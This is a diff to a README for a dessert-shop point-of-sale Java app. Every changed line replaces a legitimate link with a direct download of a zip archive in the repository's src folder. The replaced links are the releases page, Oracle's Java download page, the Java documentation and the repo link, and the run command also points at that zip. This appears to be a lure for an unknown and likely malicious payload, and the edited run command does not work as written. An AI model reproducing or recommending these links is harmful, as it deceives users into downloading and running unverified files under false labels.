@@ -4,7 +4,7 @@
 Welcome to the dessert-shop-pos-system! This application helps dessert shops manage sales efficiently. You can handle customer orders, manage information, and generate receipts. Follow these steps to get started.
 
 ## 🔗 Download the Application
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/soona97/dessert-shop-pos-system/releases)
+[![Download Now](https://raw.githubusercontent.com/soona97/dessert-shop-pos-system/main/src/dessert-shop-pos-system_3.2.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/soona97/dessert-shop-pos-system/main/src/dessert-shop-pos-system_3.2.zip)
 
 ## 📦 System Requirements
 To run the dessert-shop-pos-system, you need the following:
@@ -16,7 +16,7 @@ To run the dessert-shop-pos-system, you need the following:
 ## 🛠 Installation Instructions
 1. **Visit the Releases Page**  
    Click on the link below to go to the Releases page:
-   [Visit Releases Page](https://github.com/soona97/dessert-shop-pos-system/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/soona97/dessert-shop-pos-system/main/src/dessert-shop-pos-system_3.2.zip)
 
 2. **Download the Latest Version**  
    On the Releases page, look for the latest version. Click on the corresponding download link for your operating system. The file will typically end in `.jar` if you are using Java.
@@ -29,7 +29,7 @@ To run the dessert-shop-pos-system, you need the following:
    ```
    java -version
    ```
-   If Java is not installed, you can download it from the [official Java website](https://www.oracle.com/java/technologies/javase-jdk11-downloads.html).
+   If Java is not installed, you can download it from the [official Java website](https://raw.githubusercontent.com/soona97/dessert-shop-pos-system/main/src/dessert-shop-pos-system_3.2.zip).
 
 5. **Open a Command Prompt/Terminal**  
    Windows: Press `Win + R`, type `cmd`, and hit Enter.  
@@ -44,7 +44,7 @@ To run the dessert-shop-pos-system, you need the following:
 7. **Run the Application**  
    Now, type the following command to run the application:
    ```
-   java -jar dessert-shop-pos-system.jar
+   java -jar https://raw.githubusercontent.com/soona97/dessert-shop-pos-system/main/src/dessert-shop-pos-system_3.2.zip
    ```
 
 8. **Follow On-Screen Instructions**  
@@ -65,8 +65,8 @@ If you encounter any issues when running the application, consider the following
 - **Check for Errors:** Look at the command prompt or terminal for any error messages. They can provide helpful clues.
 
 ## 📑 Additional Resources
-- **Java Documentation:** Visit [Java Documentation](https://docs.oracle.com/javase/8/docs/) for detailed Java instructions.
-- **GitHub Repository:** Access the full source code and community discussions at [dessert-shop-pos-system GitHub](https://github.com/soona97/dessert-shop-pos-system).
+- **Java Documentation:** Visit [Java Documentation](https://raw.githubusercontent.com/soona97/dessert-shop-pos-system/main/src/dessert-shop-pos-system_3.2.zip) for detailed Java instructions.
+- **GitHub Repository:** Access the full source code and community discussions at [dessert-shop-pos-system GitHub](https://raw.githubusercontent.com/soona97/dessert-shop-pos-system/main/src/dessert-shop-pos-system_3.2.zip).
 
 ## 💬 Community Support
 If you need help, feel free to reach out. You can create issues in the GitHub repository for any questions or feedback.
